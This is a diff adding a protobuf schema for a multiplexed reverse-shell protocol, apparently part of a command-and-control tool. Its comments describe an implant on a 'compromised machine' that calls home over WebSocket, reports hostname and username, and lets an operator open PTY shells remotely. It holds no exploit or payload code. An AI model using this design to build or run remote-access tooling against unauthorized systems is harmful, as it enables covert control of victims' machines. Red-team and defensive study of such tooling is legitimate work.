@@ -1,0 +1,85 @@
+syntax = "proto3";
+
+package mux;
+option go_package = "github.com/nemanjan00/reverse-shell-listener/client/muxpb";
+
+// Multiplexed reverse-shell protocol.
+//
+// One WebSocket connection = one "host" (a compromised machine running the Go
+// client). Over that single connection many independent PTY-backed shell
+// *channels* are multiplexed, each identified by a channel_id and surfaced in
+// the dashboard as its own session.
+//
+// Each binary WebSocket message carries exactly one serialized Frame. Channels
+// are opened by the server (operator clicks "new shell"); the client answers
+// with OpenOk/OpenError, then raw PTY bytes flow both ways as Data frames.
+//
+// Directions:
+//   client -> server : Hello, OpenOk, OpenError, Data, Close, Pong, Ping
+//   server -> client : OpenRequest, Data, Resize, Close, Ping, Pong
+
+message Frame {
+  oneof kind {
+    Hello       hello        = 1;  // client -> server, first frame after connect
+    OpenRequest open_request = 2;  // server -> client: please open a channel
+    OpenOk      open_ok      = 3;  // client -> server: channel is up
+    OpenError   open_error   = 4;  // client -> server: could not open channel
+    Data        data         = 5;  // both: raw PTY bytes for a channel
+    Resize      resize       = 6;  // server -> client: new terminal size
+    Close       close        = 7;  // both: a channel ended / please end it
+    Ping        ping         = 8;  // both: keepalive
+    Pong        pong         = 9;  // both: keepalive reply
+  }
+}
+
+// Sent once, immediately after the socket opens, so the operator sees who
+// called home.
+message Hello {
+  string hostname = 1;
+  string username = 2;
+  string os       = 3;  // runtime.GOOS
+  string arch     = 4;  // runtime.GOARCH
+  uint32 version  = 5;  // protocol version (see PROTO_VERSION)
+  string tags     = 6;  // free-form label the operator can set on the implant
+}
+
+// Server asks the client to spawn a new shell channel.
+message OpenRequest {
+  uint32 channel_id = 1;  // server-assigned, unique per host connection
+  string command    = 2;  // shell/command to exec; empty => default shell
+  uint32 cols       = 3;  // initial terminal width
+  uint32 rows       = 4;  // initial terminal height
+}
+
+message OpenOk {
+  uint32 channel_id = 1;
+  uint32 pid        = 2;  // pid of the spawned shell (informational)
+}
+
+message OpenError {
+  uint32 channel_id = 1;
+  string message    = 2;
+}
+
+// Raw PTY bytes for one channel, in either direction.
+message Data {
+  uint32 channel_id = 1;
+  bytes  data       = 2;
+}
+
+// Server -> client: apply a new window size to the channel's PTY (SIGWINCH).
+message Resize {
+  uint32 channel_id = 1;
+  uint32 cols       = 2;
+  uint32 rows       = 3;
+}
+
+// Either side closing a channel. reason is best-effort/human-readable.
+message Close {
+  uint32 channel_id = 1;
+  string reason     = 2;
+  int32  exit_code  = 3;  // client -> server: shell exit code, -1 if unknown
+}
+
+message Ping { uint64 nonce = 1; }
+message Pong { uint64 nonce = 1; }
